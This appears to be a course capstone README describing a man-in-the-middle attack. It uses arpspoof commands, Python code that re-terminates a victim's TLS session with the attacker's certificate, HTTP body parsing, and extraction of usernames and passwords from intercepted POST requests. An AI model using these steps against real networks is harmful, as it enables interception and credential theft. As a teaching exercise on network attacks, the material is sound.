# Computer Security Capstone Project

---

## Project 1 - TLS Connection Hijacking

### GOAL
- Make use of arpspoofing to deceive router and victim
- Establish TLS connections between both attacker and victim, and attacker and web server
- Parsing HTML packets to ensure that the victim's browser displays the webpage properly.
- __Steal the password__ while victim is entering the login page

### STEP1 - ARP Spoofing
Make the __victim / router__ assume that the attacker is where the packet should go at next hop (originally the router / victim) by deceiving the arp packets.
```bash
sudo arpspoof -i <INTERFACE> -t <GATEWAY_IP> <CLIENT_IP>
sudo arpspoof -i <INTERFACE> -t <CLIENT_IP> <GATEWAY_IP>
```

### STEP2 - Hijacking a TLS Connection
Create a socket to make connection with victim, based on the previous ARP spoofing, the victim sends packets to the attacker. 
```python
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

client_socket, addr = server.accept()
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=certFile, keyfile=keyFile)
victim_connection = context.wrap_socket(client_socket, server_side=True)
```
Create connections between attacker and server, the server sends website information to router, and based on the previous ARP spoofing, the router will sends packets back to attacker, too.
```python
context = ssl.create_default_context()
server_connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)

server_connection.connect((host, port))
server_connection.sendall(request)
```

### STEP3 - Handle Large Packets
Normally, the size of a website is huge that one must handle packet several times. By parsing HTML header, coping with large packets will be much easier.
- HTML header format
  - "\r\n\r\n" at the end of header
  - every header is splited by "\r\n"
  - find __Content-Length__ and __Trandfer-Encoding__
- Content-Length
  - Recording the total size of the entire web page.
- Tansfer-Encoding
  - Sometimes, "Content-Length" won't be used instead of "Transfer-Encoding" since there might be a dynamic generated pages
  - If the tag is "Chunked", each chunk indicates its own length, and a final chunk with a length of 0 signals the end.
```text
4\r\n
Wiki\r\n
5\r\n
pedia\r\n
0\r\n
\r\n
```

### STEP4 - STEAL Password
- Find header named "Type", if the type of this request is post, check HTML body and the body format will be,
```text
username=<username>&password=<password>
```
